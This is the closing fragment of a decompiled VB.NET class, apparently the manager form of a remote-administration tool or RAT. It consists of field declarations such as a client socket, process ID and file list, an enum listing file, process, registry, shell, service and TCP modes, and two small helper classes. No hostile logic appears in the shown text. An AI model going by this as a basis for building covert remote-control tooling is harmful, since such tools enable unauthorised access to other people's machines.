		' Token: 0x04000194 RID: 404
		<AccessedThroughProperty("ColumnHeader15")>
		Private _ColumnHeader15 As ColumnHeader

		' Token: 0x04000195 RID: 405
		<AccessedThroughProperty("vmethod_108")>
		Private _vmethod_108 As ImageList

		' Token: 0x04000196 RID: 406
		Public Cache As Collection

		' Token: 0x04000197 RID: 407
		Public cur As Manager.CR

		' Token: 0x04000198 RID: 408
		Public Flist As String

		' Token: 0x04000199 RID: 409
		Public Images As Collection

		' Token: 0x0400019A RID: 410
		Private int_0 As Integer

		' Token: 0x0400019B RID: 411
		Private int_1 As Integer

		' Token: 0x0400019C RID: 412
		Public isCut As Boolean

		' Token: 0x0400019D RID: 413
		Public PID As Integer

		' Token: 0x0400019E RID: 414
		Public PRFX As Boolean

		' Token: 0x0400019F RID: 415
		Public PRNXT As Boolean

		' Token: 0x040001A0 RID: 416
		Public RGCH As Collection

		' Token: 0x040001A1 RID: 417
		Public shStarted As Integer

		' Token: 0x040001A2 RID: 418
		Public sk As Client

		' Token: 0x040001A3 RID: 419
		Public SrvFX As Boolean

		' Token: 0x040001A4 RID: 420
		Public srvNxt As Boolean

		' Token: 0x040001A5 RID: 421
		Private string_0 As String

		' Token: 0x040001A6 RID: 422
		Private string_1 As String()

		' Token: 0x040001A7 RID: 423
		Public TCPFX As Boolean

		' Token: 0x040001A8 RID: 424
		Public TCPNXT As Boolean

		' Token: 0x02000013 RID: 19
		Public Enum CR
			' Token: 0x040001AA RID: 426
			fm
			' Token: 0x040001AB RID: 427
			PR
			' Token: 0x040001AC RID: 428
			reg = 3
			' Token: 0x040001AD RID: 429
			shl
			' Token: 0x040001AE RID: 430
			srv
			' Token: 0x040001AF RID: 431
			tcp = 2
		End Enum

		' Token: 0x02000014 RID: 20
		Public NotInheritable Class GClass13
			' Token: 0x060003BC RID: 956 RVA: 0x00002AB2 File Offset: 0x00000CB2
			Public Sub New()
				Me.list_0 = New List(Of String())()
				Me.list_1 = New List(Of String)()
			End Sub

			' Token: 0x040001B0 RID: 432
			Public list_0 As List(Of String())

			' Token: 0x040001B1 RID: 433
			Public list_1 As List(Of String)

			' Token: 0x040001B2 RID: 434
			Public string_0 As String
		End Class

		' Token: 0x02000015 RID: 21
		Public NotInheritable Class GClass14
			' Token: 0x060003BD RID: 957 RVA: 0x00002AD0 File Offset: 0x00000CD0
			Public Sub New()
				Me.list_0 = New List(Of String)()
				Me.list_1 = New List(Of String)()
			End Sub

			' Token: 0x040001B3 RID: 435
			Public list_0 As List(Of String)

			' Token: 0x040001B4 RID: 436
			Public list_1 As List(Of String)

			' Token: 0x040001B5 RID: 437
			Public string_0 As String
		End Class
	End Class
End Namespace
